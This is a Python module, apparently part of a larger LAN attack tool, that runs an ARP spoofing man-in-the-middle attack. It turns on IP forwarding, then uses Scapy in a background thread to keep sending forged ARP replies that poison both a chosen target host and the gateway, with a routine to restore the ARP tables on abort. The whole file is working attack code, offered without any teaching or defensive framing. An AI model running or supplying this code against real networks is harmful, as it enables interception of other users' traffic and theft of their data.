import signal
from scapy import all as scapy
import scapy.layers.l2 as l2
import scapy.layers.inet as inet
import sys, os
import time
import threading

import interface
import scan_lan


ON=False
attack=None

def prepare_system():
    with open ("/proc/sys/net/ipv4/ip_forward","w") as file:
        file.write("1")
    time.sleep(3)

def catch_abort(_1,_2):
    print ("[!] Aborting...")
    restore_all(gateway_ip=scapy.conf.route.route("0.0.0.0")[2] ,gateway_mac=get_mac_in_local(scapy.conf.route.route("0.0.0.0")[2]), target_ip=scan_lan.selected_target_ip, target_mac=scan_lan.selected_target_mac)

def restore_all(gateway_ip, gateway_mac, target_ip, target_mac):
    p1=l2.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff".upper(), hwsrc=gateway_mac)
    p2=l2.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff".upper(), hwsrc=target_mac)

    scapy.send(p1,count=5, verbose=False)
    scapy.send(p2,count=5, verbose=False)

    with open ("/proc/sys/net/ipv4/ip_forward","w") as file:
        file.write("0")

    time.sleep(3)
    interface.show()
    sys.exit(0)
def get_mac_in_local(ip_address):
    if ip_address in scan_lan.ip_table:
        return scan_lan.mac_table[scan_lan.ip_table.index(ip_address)]


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global ON
    poison_for_target=l2.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    poison_for_gateway=l2.ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac)


#    signal.signal(20, catch_abort)
    while True:
        if ON:
            time.sleep(1)
            scapy.send(poison_for_target,verbose=False)
            scapy.send(poison_for_gateway,verbose=False)
        else:
            break

def run():
    global attack
    global ON
    if ON:
        ON=False
        restore_all(gateway_ip=scapy.conf.route.route("0.0.0.0")[2] ,gateway_mac=get_mac_in_local(scapy.conf.route.route("0.0.0.0")[2]), target_ip=scan_lan.selected_target_ip, target_mac=scan_lan.selected_target_mac)
        interface.show()
        sys.exit(0)
    else:
        ON=True
        prepare_system()
        target_mac=get_mac_in_local(scan_lan.selected_target_ip)
        print (f"gateway_ip={scapy.conf.route.route('0.0.0.0')[2]}\ngateway_mac={get_mac_in_local(scapy.conf.route.route('0.0.0.0')[2])}\ntarget_ip={scan_lan.selected_target_ip}\ntarget_mac={scan_lan.selected_target_mac}")
        attack=threading.Thread(target=poison_target, args=(scapy.conf.route.route("0.0.0.0")[2] ,get_mac_in_local(scapy.conf.route.route("0.0.0.0")[2]),scan_lan.selected_target_ip,scan_lan.selected_target_mac))
        attack.start()
        interface.show()
